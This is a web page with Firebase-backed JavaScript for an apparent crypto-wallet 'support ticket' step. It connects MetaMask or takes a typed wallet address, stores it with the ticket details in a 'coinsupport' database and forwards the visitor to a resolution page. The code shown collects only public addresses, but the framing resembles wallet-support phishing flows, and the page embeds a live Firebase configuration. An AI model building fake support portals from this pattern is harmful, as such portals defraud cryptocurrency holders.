<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Wallet</title>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <style>
        body { background-color: #000; color: white; font-family: system-ui, sans-serif; }
        .card { transition: all 0.2s ease; }
        .card:hover { transform: translateY(-4px); border-color: #3b82f6; box-shadow: 0 0 15px rgba(59, 130, 246, 0.3); }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">

    <div class="max-w-md w-full bg-gray-900 p-8 rounded-xl border border-gray-800 shadow-lg">
        <h1 class="text-2xl font-bold mb-6 text-center">Connect Your Wallet</h1>

        <!-- Display Ticket ID and Issue -->
        <div class="mb-6 space-y-2">
            <div class="flex justify-between text-sm">
                <span class="text-gray-400">Ticket ID:</span>
                <span id="ticket-display" class="font-mono text-blue-400">Loading...</span>
            </div>
            <div class="flex justify-between text-sm">
                <span class="text-gray-400">Issue:</span>
                <span id="issue-display" class="text-white">Loading...</span>
            </div>
            <div class="flex justify-between text-sm">
                <span class="text-gray-400">Wallet:</span>
                <span id="wallet-display" class="text-white truncate max-w-[200px]">Loading...</span>
            </div>
        </div>

        <!-- Connect Button -->
        <button onclick="connectWallet()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-4 rounded-lg transition shadow-lg shadow-blue-600/30 mb-4">
            Connect Wallet
        </button>

        <!-- Manual Input Fallback -->
        <div class="mt-4 pt-4 border-t border-gray-800">
            <p class="text-xs text-gray-500 mb-2 text-center">Or enter your wallet address manually:</p>
            <input type="text" id="manual-address" placeholder="e.g., 0x123...abc" class="w-full bg-gray-800 border border-gray-700 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-blue-500">
            <button onclick="submitManual()" class="w-full mt-2 bg-gray-700 hover:bg-gray-600 text-white font-medium py-2 rounded-lg transition">
                Submit Address
            </button>
        </div>
        
        <!-- Error Message Container -->
        <div id="error-msg" class="mt-4 text-red-400 text-sm text-center hidden"></div>
    </div>

    <!-- Firebase Integration -->
    <script type="module">
        // Import Firebase Modules
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-analytics.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";

        // Your Web App's Firebase Configuration
        const firebaseConfig = {
            apiKey: "AIzaSyC33I7HRwiKo7DtdRsdtdK6OnqDwAquJfI",
            authDomain: "coinsupport-8b036.firebaseapp.com",
            databaseURL: "https://coinsupport-8b036-default-rtdb.europe-west1.firebasedatabase.app",
            projectId: "coinsupport-8b036",
            storageBucket: "coinsupport-8b036.firebasestorage.app",
            messagingSenderId: "575774102570",
            appId: "1:575774102570:web:1d0c34b60807dfb2c75f53",
            measurementId: "G-YGCSNX4H9L"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const analytics = getAnalytics(app);
        const db = getDatabase(app);

        // --- LOGIC ---

        // 1. Robust ID Retrieval
        function getIssueId() {
            const urlParams = new URLSearchParams(window.location.search);
            const idFromUrl = urlParams.get('id');
            
            if (idFromUrl) return idFromUrl;

            const idFromStorage = localStorage.getItem('currentTicketId');
            if (idFromStorage) return idFromStorage;

            console.warn("No ID found! Generating a new one.");
            const newId = `TICKET-${Date.now()}-${Math.floor(Math.random() * 1000)}`;
            localStorage.setItem('currentTicketId', newId);
            return newId;
        }

        // 2. Populate Page Data
        const ticketId = getIssueId();
        const selectedIssue = localStorage.getItem('selectedIssue') || 'Unknown';
        const selectedWallet = localStorage.getItem('selectedWallet') || 'Unknown';

        document.getElementById('ticket-display').textContent = ticketId;
        document.getElementById('issue-display').textContent = selectedIssue;
        document.getElementById('wallet-display').textContent = selectedWallet;

        // 3. Connect Wallet Function
        window.connectWallet = async function() {
            try {
                if (typeof window.ethereum !== 'undefined') {
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    const userAddress = accounts[0];
                    
                    saveToFirebase(userAddress);
                } else {
                    alert("Please install MetaMask!");
                }
            } catch (error) {
                console.error(error);
                showError("Failed to connect wallet.");
            }
        };

        // 4. Manual Submission
        window.submitManual = function() {
            const address = document.getElementById('manual-address').value;
            if (address) {
                saveToFirebase(address);
            } else {
                showError("Please enter an address.");
            }
        };

        // 5. Save to Firebase
        function saveToFirebase(walletAddress) {
            const ticketRef = ref(db, 'tickets/' + ticketId);
            set(ticketRef, {
                ticketId: ticketId,
                issue: selectedIssue,
                walletName: selectedWallet,
                walletAddress: walletAddress,
                timestamp: Date.now(),
                status: 'Open'
            })
            .then(() => {
                window.location.href = `resolution.html?id=${ticketId}`;
            })
            .catch((error) => {
                console.error("Error saving data: ", error);
                showError("Error saving data. Please try again.");
            });
        }

        function showError(msg) {
            const errorDiv = document.getElementById('error-msg');
            errorDiv.textContent = msg;
            errorDiv.classList.remove('hidden');
        }
    </script>
</body>
</html>
